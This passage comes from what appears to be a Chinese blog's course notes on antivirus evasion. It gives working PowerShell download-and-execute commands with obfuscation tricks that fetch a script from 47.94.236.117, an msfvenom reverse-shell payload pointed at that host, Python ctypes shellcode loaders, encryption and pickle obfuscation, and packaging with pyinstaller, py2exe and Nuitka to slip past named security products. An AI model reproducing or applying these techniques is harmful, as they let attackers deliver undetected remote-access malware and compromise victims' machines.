title="#PowerShell-EXE模式-Ladon&amp;Win-PS2"></a>#PowerShell-EXE模式-Ladon&amp;Win-PS2</h3><h6 id="1、GUI-X工具箱内置Ladon"><a href="#1、GUI-X工具箱内置Ladon" class="headerlink" title="1、GUI-X工具箱内置Ladon"></a>1、GUI-X工具箱内置Ladon</h6><h6 id="默认生成tmp-exe，能过x绒"><a href="#默认生成tmp-exe，能过x绒" class="headerlink" title="默认生成tmp.exe，能过x绒"></a>默认生成tmp.exe，能过x绒</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430192632768.png" alt="image-20230430192632768"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430193130084.png" alt="image-20230430193130084"></p><h6 id="2、Win-PS2EXE：https-github-com-MScholtes-Win-PS2EXE（过x60还是有点费劲）"><a href="#2、Win-PS2EXE：https-github-com-MScholtes-Win-PS2EXE（过x60还是有点费劲）" class="headerlink" title="2、Win-PS2EXE：https://github.com/MScholtes/Win-PS2EXE（过x60还是有点费劲）"></a>2、Win-PS2EXE：<a href="https://github.com/MScholtes/Win-PS2EXE%EF%BC%88%E8%BF%87x60%E8%BF%98%E6%98%AF%E6%9C%89%E7%82%B9%E8%B4%B9%E5%8A%B2%EF%BC%89">https://github.com/MScholtes/Win-PS2EXE（过x60还是有点费劲）</a></h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430193547974.png" alt="image-20230430193547974"></p><h3 id="PowerShell-命令模式-加载-amp-替换-amp-填充等"><a href="#PowerShell-命令模式-加载-amp-替换-amp-填充等" class="headerlink" title="#PowerShell-命令模式-加载&amp;替换&amp;填充等"></a>#PowerShell-命令模式-加载&amp;替换&amp;填充等</h3><h5 id="1、原型：（拦截）"><a href="#1、原型：（拦截）" class="headerlink" title="1、原型：（拦截）"></a>1、原型：（拦截）</h5><p>powershell -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://47.94.236.117/x.ps1">http://47.94.236.117/x.ps1</a>‘))”</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172722329.png" alt="image-20230430172722329"></p><h5 id="2、替换文件名：（可绕过）"><a href="#2、替换文件名：（可绕过）" class="headerlink" title="2、替换文件名：（可绕过）"></a>2、替换文件名：（可绕过）</h5><h6 id="原本执行：（会拦截）"><a href="#原本执行：（会拦截）" class="headerlink" title="原本执行：（会拦截）"></a>原本执行：（会拦截）</h6><ul><li>powershell “$a&#x3D;’IEX((New-Object Net.WebClient).DownloadString(‘’ht’;$b&#x3D;’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’’));’;IEX ($a+$b)”</li></ul><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430173950151.png" alt="image-20230430173950151"></p><h6 id="将powershell程序改名-可绕过"><a href="#将powershell程序改名-可绕过" class="headerlink" title="将powershell程序改名 (可绕过)"></a>将powershell程序改名 (可绕过)</h6><ul><li><p>copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe</p></li><li><p>.\bypass.exe “$a&#x3D;’IEX((New-Object Net.WebClient).DownloadString(‘’ht’;$b&#x3D;’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’’));’;IEX ($a+$b)”</p></li><li><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430174121121.png" alt="image-20230430174121121"></p></li></ul><h5 id="3、垃圾数据干扰：（可绕过）"><a href="#3、垃圾数据干扰：（可绕过）" class="headerlink" title="3、垃圾数据干扰：（可绕过）"></a>3、垃圾数据干扰：（可绕过）</h5><p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(‘ht’+’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’)</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172820159.png" alt="image-20230430172820159"></p><h5 id="4、替换关键字：（可绕过）"><a href="#4、替换关键字：（可绕过）" class="headerlink" title="4、替换关键字：（可绕过）"></a>4、替换关键字：（可绕过）</h5><p>powershell -NoExit “$c1&#x3D;’IEX(New-Object Net.WebClient).Downlo’;$c2&#x3D;’123(‘’<a href="http://47.94.236.117/x.ps1'')'.Replace('123','adString');IEX">http://47.94.236.117/x.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX</a> ($c1+$c2)”</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430173209154.png" alt="image-20230430173209154"></p><h5 id="5、Ladon混淆命令"><a href="#5、Ladon混淆命令" class="headerlink" title="5、Ladon混淆命令"></a>5、Ladon混淆命令</h5><h6 id="用hex等编码混淆（但是这里被杀了）"><a href="#用hex等编码混淆（但是这里被杀了）" class="headerlink" title="用hex等编码混淆（但是这里被杀了）"></a>用hex等编码混淆（但是这里被杀了）</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430192400395.png" alt="image-20230430192400395"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%8</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day108 免杀对抗-Python&amp;混淆算法&amp;反序列化&amp;打包生成器&amp;Py2exe&amp;Nuitka</title>
    <link href="http://example.com/2023/04/27/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/"/>
    <id>http://example.com/2023/04/27/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/</id>
    <published>2023-04-27T00:33:39.000Z</published>
    <updated>2023-05-02T12:25:50.976Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/mfwHF868WsV2LVXakxt9GQ.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Python-对执行代码做文章</p><p>2、Python-对shellcode做文章</p><p>3、Python-对代码打包器做文章</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码"><a href="#➢-Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码" class="headerlink" title="➢ Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码"></a>➢ Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码</h4><h4 id="➢-Python-混淆加密-Base64-amp-AES-amp-反序列化等"><a href="#➢-Python-混淆加密-Base64-amp-AES-amp-反序列化等" class="headerlink" title="➢ Python-混淆加密-Base64&amp;AES&amp;反序列化等"></a>➢ Python-混淆加密-Base64&amp;AES&amp;反序列化等</h4><h4 id="➢-Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka"><a href="#➢-Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka" class="headerlink" title="➢ Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka"></a>➢ Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h4></blockquote><h3 id="Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码"><a href="#Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码" class="headerlink" title="#Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码"></a>#Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码</h3><p><strong>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</strong></p><p><strong>cs 生成payload c或python</strong></p><h5 id="执行代码1："><a href="#执行代码1：" class="headerlink" title="执行代码1："></a>执行代码1：</h5><p><code>rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</code></p><p><code>ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</code></p><p><code>handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</code></p><p><code>ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</code></p><h5 id="执行代码2："><a href="#执行代码2：" class="headerlink" title="执行代码2："></a>执行代码2：</h5><p><code>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</code></p><p><code>ctypes.c_int(len(shellcode)),</code></p><p><code>ctypes.c_int(0x3000),</code></p><p><code>ctypes.c_int(0x40))</code></p><p><code>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</code></p><p><code>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</code></p><p><code>buf,</code></p><p><code>ctypes.c_int(len(shellcode)))</code></p><p><code>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.c_int(ptr),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.pointer(ctypes.c_int(0)))</code></p><p><code>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</code></p><h3 id="Python-混淆加密-Base64-amp-AES-amp-反序列化等"><a href="#Python-混淆加密-Base64-amp-AES-amp-反序列化等" class="headerlink" title="#Python-混淆加密-Base64&amp;AES&amp;反序列化等"></a>#Python-混淆加密-Base64&amp;AES&amp;反序列化等</h3><h5 id="Ps：具体见代码及讲解思路"><a href="#Ps：具体见代码及讲解思路" class="headerlink" title="Ps：具体见代码及讲解思路"></a>Ps：具体见代码及讲解思路</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-–encrypt-base64-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-–encrypt-base64-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp –encrypt base64 lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp –encrypt base64 lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</h5><h5 id="另外的Xor，Rc4等加密算法都可以实现测试"><a href="#另外的Xor，Rc4等加密算法都可以实现测试" class="headerlink" title="另外的Xor，Rc4等加密算法都可以实现测试"></a>另外的Xor，Rc4等加密算法都可以实现测试</h5><h5 id="1、Base64"><a href="#1、Base64" class="headerlink" title="1、Base64"></a>1、Base64</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428130650488.png" alt="image-20230428130650488"></p><h5 id="2、AES-base64"><a href="#2、AES-base64" class="headerlink" title="2、AES+base64"></a>2、AES+base64</h5><h6 id="这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本"><a href="#这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本" class="headerlink" title="这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本"></a>这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428131330518.png" alt="image-20230428131330518"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428150642079.png" alt="image-20230428150642079"></p><h6 id="将上面的加密代码放到下面发布版本release，只需要解密代码就行"><a href="#将上面的加密代码放到下面发布版本release，只需要解密代码就行" class="headerlink" title="将上面的加密代码放到下面发布版本release，只需要解密代码就行"></a>将上面的加密代码放到下面发布版本release，只需要解密代码就行</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428132006748.png" alt="image-20230428132006748"></p><h6 id="运行后上线"><a href="#运行后上线" class="headerlink" title="运行后上线"></a>运行后上线</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428132024438.png" alt="image-20230428132024438"></p><h5 id="3、反序列化"><a href="#3、反序列化" class="headerlink" title="3、反序列化"></a>3、反序列化</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143109745.png" alt="image-20230428143109745"></p><h6 id="先写一个序列化的脚本将代码序列化后打印出来"><a href="#先写一个序列化的脚本将代码序列化后打印出来" class="headerlink" title="先写一个序列化的脚本将代码序列化后打印出来"></a>先写一个序列化的脚本将代码序列化后打印出来</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143409117.png" alt="image-20230428143409117"></p><h6 id="这是打印后的结果"><a href="#这是打印后的结果" class="headerlink" title="这是打印后的结果"></a>这是打印后的结果</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143529404.png" alt="image-20230428143529404"></p><h6 id="另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去"><a href="#另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去" class="headerlink" title="另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去"></a>另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143653699.png" alt="image-20230428143653699"></p><h6 id="执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密"><a href="#执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密" class="headerlink" title="执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密"></a>执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143814604.png" alt="image-20230428143814604"></p><h3 id="Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka"><a href="#Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka" class="headerlink" title="#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka"></a>#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h3><h5 id="使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果"><a href="#使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果" class="headerlink" title="使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果"></a>使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果</h5><h4 id="1、pyinstaller（生成的exe文件比较大）"><a href="#1、pyinstaller（生成的exe文件比较大）" class="headerlink" title="1、pyinstaller（生成的exe文件比较大）"></a>1、pyinstaller（生成的exe文件比较大）</h4><p>-F, –onefile 打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用</p><p>-D, –onedir 打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护</p><p>-K, –tk 在部署时包含 TCL&#x2F;TK</p><p>-a, –ascii 不包含编码.在支持Unicode的python版本上默认包含所有的编码.</p><p>-d, –debug 产生debug版本的可执行文件</p><p>-w,–windowed,–noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</p><p>-c,–nowindowed,–console 使用控制台子系统执行(默认)(只对Windows有效)</p><h5 id="使用：pyinstaller-F-test-py"><a href="#使用：pyinstaller-F-test-py" class="headerlink" title="使用：pyinstaller -F test.py"></a>使用：pyinstaller -F test.py</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428153107147.png" alt="image-20230428153107147"></p><h4 id="2、py2exe"><a href="#2、py2exe" class="headerlink" title="2、py2exe"></a>2、py2exe</h4><h5 id="安装：pip-install-py2exe"><a href="#安装：pip-install-py2exe" class="headerlink" title="安装：pip install py2exe"></a>安装：pip install py2exe</h5><h5 id="打包：python-setup-py-py2exe"><a href="#打包：python-setup-py-py2exe" class="headerlink" title="打包：python setup.py py2exe"></a>打包：python setup.py py2exe</h5><h5 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h5><h5 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line">INCLUDES = [&#x27;108-pickle-release&#x27;] #注意修改脚本项目名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">options = &#123;</span><br><span class="line"></span><br><span class="line">​    &quot;py2exe&quot;:</span><br><span class="line">​        &#123;</span><br><span class="line">​            &quot;compressed&quot;: 1,  # 0或1,1压缩，0不压缩</span><br><span class="line">​            &quot;optimize&quot;: 2,  # 0、1、2，文件的优化级别</span><br><span class="line">​            &quot;bundle_files&quot;: 1,  # 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定</span><br><span class="line">​            &quot;includes&quot;: INCLUDES,  # 列表，包含其它的一些模块</span><br><span class="line">​            &quot;dll_excludes&quot;: [&#x27;MSVCP90.dll&#x27;]  # 列表，包含的dll文件不会打包进exe程序</span><br><span class="line">​        &#125;</span><br><span class="line">&#125;</span><br><span class="line">setup(</span><br><span class="line">​    version=&#x27;1.0.0&#x27;,</span><br><span class="line">​    options=options,</span><br><span class="line">​    description=&quot;this is a xiaodi test&quot;,</span><br><span class="line">​    zipfile=None,  # 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中</span><br><span class="line">​    console=[&#123;&quot;script&quot;: &#x27;108-pickle-release.py&#x27;&#125;]  # 生成一个控制台形式的exe程序，对应的有windows=[]，生成GUI形式的exe程序</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428145821822.png" alt="image-20230428145821822"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428153207361.png" alt="image-20230428153207361"></p><h4 id="3、Nuitka-生成的文件最小"><a href="#3、Nuitka-生成的文件最小" class="headerlink" title="3、Nuitka(生成的文件最小)"></a>3、Nuitka(生成的文件最小)</h4><p>–standalone：方便移植到其他机器，不用再安装python</p><p>–show-memory –show-progress：展示整个安装的进度过程</p><p>–nofollow-imports：不编译代码中所有的import</p><p>–follow-import-to&#x3D;utils,src：需要编译成C++代码的指定的2个包含源码的文件夹，这里用,来进行分隔。</p><p>–output-dir&#x3D;out：指定输出的结果路径为out。</p><p>–windows-disable-console：运行exe取消弹框。</p><p>–mingw64 #默认为已经安装的vs2017去编译，否则就按指定的比如mingw(官方建议)</p><p>–standalone 独立环境，这是必须的(否则拷给别人无法使用)</p><p>–windows-disable-console 没有CMD控制窗口</p><p>–output-dir&#x3D;out 生成exe到out文件夹下面去</p><p>–show-progress 显示编译的进度，很直观</p><p>–show-memory 显示内存的占用</p><p>–include-qt-plugins&#x3D;sensible,styles 打包后PyQt的样式就不会变了</p><p>–plugin-enable&#x3D;qt-plugins 需要加载的PyQt插件</p><p>–plugin-enable&#x3D;tk-inter 打包tkinter模块的刚需</p><p>–plugin-enable&#x3D;numpy 打包numpy,pandas,matplotlib模块的刚需</p><p>–plugin-enable&#x3D;torch 打包pytorch的刚需</p><p>–plugin-enable&#x3D;tensorflow 打包tensorflow的刚需</p><p>–windows-icon-from-ico&#x3D;你的.ico 软件的图标</p><p>–windows-company-name&#x3D;Windows下软件公司信息</p><p>–windows-product-name&#x3D;Windows下软件名称</p><p>–windows-file-version&#x3D;Windows下软件的信息</p><p>–windows-product-version&#x3D;Windows下软件的产品信息</p><p>–windows-file-description&#x3D;Windows下软件的作用描述</p><p>–windows-uac-admin&#x3D;Windows下用户可以使用管理员权限来安装</p><p>–linux-onefile-icon&#x3D;Linux下的图标位置</p><p>–onefile 像pyinstaller一样打包成单个exe文件</p><p>–include-package&#x3D;复制比如numpy,PyQt5 这些带文件夹的叫包或者轮子</p><p>–include-module&#x3D;复制比如when.py 这些以.py结尾的叫模块</p><p><strong>使用：nuitka –mingw64 –standalone –show-memory –show-progress –nofollow-imports –follow-import-to&#x3D;utils,src –output-dir&#x3D;out 108.py</strong></p><h5 id="生成后免杀效果也比较好"><a href="#生成后免杀效果也比较好" class="headerlink" title="生成后免杀效果也比较好"></a>生成后免杀效果也比较好</h5><h5 id="还可以做优化，将执行代码base64"><a href="#还可以做优化，将执行代码base64" class="headerlink" title="还可以做优化，将执行代码base64"></a>还可以做优化，将执行代码base64</h5><p><img 